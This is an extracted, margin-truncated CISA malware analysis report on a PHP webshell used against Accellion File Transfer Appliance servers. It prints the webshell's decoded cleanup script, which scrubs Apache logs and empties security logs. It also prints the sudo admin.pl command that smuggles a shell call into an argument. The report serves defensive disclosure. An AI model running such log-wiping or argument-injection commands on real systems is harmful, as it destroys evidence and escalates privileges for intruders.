Summary
Description

This Malware Analysis Report (MAR) analyzes a malicious Hypertext Preprocessor (PHP) webshell file submitted to CISA for analysis. The websh
uploaded to an Accellion File Transfer Appliance (FTA) server, a secure file transfer application used by customers to send large files. The websh
Structured Query Language (SQL) injection vulnerability to install itself onto the impacted FTA server. The webshell provides threat actors with the
obtain file metadata, and download files stored on the Accellion FTA server.
This webshell has been used in recent cyberattacks targeting users of Accellion FTA. For more information on these attacks, refer to Joint Cybers

Description

The file, about.html, is a malicious Hypertext Preprocessor (PHP) webshell which leverages a SQL injection vulnerability to install itself onto the co
FTA server. When the webshell is successfully installed, it provides threat actors the ability to download files stored on the FTA server.
Analysis indicates that the FTA server was compromised, which allows the threat actor the ability to craft an HTTP request directly to the webshel
be executed as if the threat actor had local (shell) access to the FTA server.
When executed on the compromised FTA server, the webshell will attempt to check if the HTTP request accessing this resource includes the para
(Figure 2). If the two parameters are available in the HTTP request, then the webshell will use the decrypt function to decrypt the contents of the o
and store it in the value named "$path". It conducts the same process on the "fn" parameter and stores the value in the variable named "$fname".
the file located at "$path" exists on the compromised FTA server. If the file exits, then the "$path" and "$fname" variables are used to call the read
download the contents of the targeted file.
Note: The encrypt and decrypt functions are undefined in the webshell, it's possible that both functions are included in either one or two of the files
webshell, "function.inc" and "remote.inc".
The file checks if the HTTP request has the parameter "csrftoken" and the parameter has the value "11454bd782bb41db213d415e10a0fb3c" (Fig
will use the clean_up function to delete itself from the victim's system.
The clean_up function contains another function, file_put_contents. This function is used by the webshell to create the file "/tmp/.scr" and decode
string contained in the file (Figure 4).
Displayed below are the contents within the decoded base64 encoded string:
--Begin decoded contents within the base64 encoded string-#!/bin/sh
for log in `ls /var/opt/apache/*log*`;do cat $log 2>/dev/null | grep -v 'about.html' > /tmp/x;mv /tmp/x $log;rm -rf /tmp/x;done
echo -n > /home/seos/log/adminpl.log;
rm -rf /home/httpd/html/about.html > /tmp/.out
rm -rfv /home/httpd/html/oauth.api > /tmp/.out
chmod 777 /tmp/.out
chown nobody:nobody /tmp/.out
echo > /var/log/secure
--End decoded contents within the base64 encoded string-The decoded content "/tmp/.scr" is a script file used by the webshell to evade detection and analysis. The script file is designed to iterate through
"/var/opt/apache/*log*" on the victim's system and return all the results not pertaining to about.html and store them in "/tmp/x". This file is used to r
file before removing the file "/tmp/x" from the victim's system. This will results in Apache logs that have been sterilized for references to about.htm
analysis capabilities.
The script file will attempt to remove "/home.seos/courier/about.html" and "/home/seos/courier/oauth.api" from the victim's system. Once these file
redirects standard output to "/tmp/.out" before modifying its ownership and permissions making it more difficult to recover and analyze.
The script file is executed by invoking the Perl System function, which is used for executing arbitrary Unix commands on a system. The "admin.pl"
script file.

2/11

Displayed below is the command used to execute the script file:
--Begin command-@system('sudo /usr/local/bin/admin.pl --mount_cifs=AF,DF,"\'\$(sh /tmp/.scr)\'",PASSWORD 1>/dev/null 2>/dev/null');
--End command-The script file "/tmp/.scr" and "/tmp/.out" will later be unlinked and deleted from the victim's system.
If the HTTP request does not match the parameters for downloading file contents (Figure 2) or performing the cleanup process (Figure 3), then th
receive an application ID from the parameter aid obtained from the HTTP request (Figure 5). This application ID is used to open the associated da
SQL command against it (Figure 6).
The cleanup mechanism is invoked to remove the webshell from the system and Apache logs only if the webshell returns no results from the SQL
victim's system. If the webshell returns results from the SQL query executed on the victim's system, then the results are returned to the webshell i
technique allows the threat actor to manually download file contents or initiate the cleanup process by clicking on their respective links.
Displayed below are Indicators of Compromise (IOCs) related to this malicious webshell:

Figure 2 - The webshell contains a functionality used to download targeted files from the FTA server. The webshell verifies if the HTTP request co
"dwn" and "fn" prior to downloading the targeted file.

Figure 3 - The webshell checks if the HTTP request has the parameter "csrftoken" and a corresponding value "11454bd782bb41db213d415e10a
clean_up function to delete itself from the victim's system.

Figure 4 - The webshell creates the script file "/tmp/.scr" and decodes an encoded base64 string contained in the script file.

Figure 5 - The webshell uses the aid parameter to open associated database and execute a SQL command against it.

Figure 6 - This is the SQL Command executed against the associated database.
